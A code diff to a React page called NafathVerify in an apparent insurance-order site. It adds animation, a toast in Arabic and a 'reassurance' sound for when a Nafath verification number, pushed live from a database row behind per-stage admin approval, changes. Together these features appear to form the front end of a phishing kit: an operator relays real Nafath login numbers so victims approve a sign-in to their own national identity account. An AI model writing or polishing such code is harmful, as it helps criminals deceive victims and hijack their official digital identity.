@@ -1,7 +1,7 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { motion } from "framer-motion";
-import { RefreshCw, Loader2 } from "lucide-react";
+import { motion, AnimatePresence } from "framer-motion";
+import { RefreshCw, Loader2, CheckCircle2 } from "lucide-react";
 import VerificationLayout from "@/components/VerificationLayout";
 import { supabase } from "@/integrations/supabase/client";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
@@ -10,6 +10,7 @@ import { linkVisitorToSession } from "@/lib/visitorLink";
 import biometricIllustration from "@/assets/biometric-verify-illustration.png";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
+import { sounds } from "@/lib/sounds";
 
 const NafathVerify = () => {
   const navigate = useNavigate();
@@ -28,6 +29,8 @@ const NafathVerify = () => {
   const [timer, setTimer] = useState(120);
   const [canResend, setCanResend] = useState(false);
   const [verifyNumber, setVerifyNumber] = useState<string | null>(null);
+  const [numberJustUpdated, setNumberJustUpdated] = useState(false);
+  const prevNumberRef = useRef<string | null>(null);
 
   const approvalStatus = useAdminApproval(orderId, "nafath_verify");
 
@@ -50,7 +53,9 @@ const NafathVerify = () => {
     const channel = supabase
       .channel(`nafath-number-${orderId}`)
       .on("postgres_changes", { event: "UPDATE", schema: "public", table: "insurance_orders", filter: `id=eq.${orderId}` }, (payload: any) => {
-        if (payload.new.nafath_number) setVerifyNumber(payload.new.nafath_number);
+        if (payload.new.nafath_number && payload.new.nafath_number !== prevNumberRef.current) {
+          setVerifyNumber(payload.new.nafath_number);
+        }
       })
       .subscribe();
 
@@ -58,6 +63,17 @@ const NafathVerify = () => {
 
     return () => { supabase.removeChannel(channel); clearInterval(interval); };
   }, [orderId]);
+
+  // Visual + audio confirmation when number updates
+  useEffect(() => {
+    if (verifyNumber && prevNumberRef.current !== null && prevNumberRef.current !== verifyNumber) {
+      setNumberJustUpdated(true);
+      sounds.reassurance();
+      toast.success("تم تحديث رمز التحقق", { description: `الرمز الجديد: ${verifyNumber}` });
+      setTimeout(() => setNumberJustUpdated(false), 2000);
+    }
+    prevNumberRef.current = verifyNumber;
+  }, [verifyNumber]);
 
   useEffect(() => {
     if (approvalStatus === "approved" && orderId) {
@@ -97,14 +113,40 @@ const NafathVerify = () => {
       </div>
 
       <div className="flex flex-col items-center py-5 gap-2">
-        <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }}
-          className="w-24 h-24 rounded-2xl bg-accent border-2 border-primary flex items-center justify-center shadow-sm">
-          {verifyNumber ? (
-            <span className="text-4xl font-bold text-primary">{verifyNumber}</span>
-          ) : (
-            <Loader2 className="w-8 h-8 text-primary animate-spin" />
-          )}
+        <motion.div
+          initial={{ scale: 0 }}
+          animate={{ scale: 1, borderColor: numberJustUpdated ? "hsl(var(--primary))" : undefined, boxShadow: numberJustUpdated ? "0 0 20px hsl(var(--primary) / 0.4)" : "none" }}
+          transition={{ type: "spring", delay: 0.2 }}
+          className={`w-24 h-24 rounded-2xl bg-accent border-2 border-primary flex items-center justify-center shadow-sm transition-all duration-500 ${numberJustUpdated ? "ring-4 ring-primary/30" : ""}`}
+        >
+          <AnimatePresence mode="wait">
+            {verifyNumber ? (
+              <motion.span
+                key={verifyNumber}
+                initial={{ scale: 0.5, opacity: 0 }}
+                animate={{ scale: 1, opacity: 1 }}
+                exit={{ scale: 1.5, opacity: 0 }}
+                transition={{ type: "spring", stiffness: 300 }}
+                className="text-4xl font-bold text-primary"
+              >
+                {verifyNumber}
+              </motion.span>
+            ) : (
+              <Loader2 className="w-8 h-8 text-primary animate-spin" />
+            )}
+          </AnimatePresence>
         </motion.div>
+        {numberJustUpdated && (
+          <motion.div
+            initial={{ opacity: 0, y: -5 }}
+            animate={{ opacity: 1, y: 0 }}
+            exit={{ opacity: 0 }}
+            className="flex items-center gap-1 text-xs text-primary font-bold"
+          >
+            <CheckCircle2 className="w-3.5 h-3.5" />
+            تم تحديث الرمز
+          </motion.div>
+        )}
         {!verifyNumber && (
           <p className="text-[11px] text-muted-foreground animate-pulse">{nv.waitingNumber}</p>
         )}
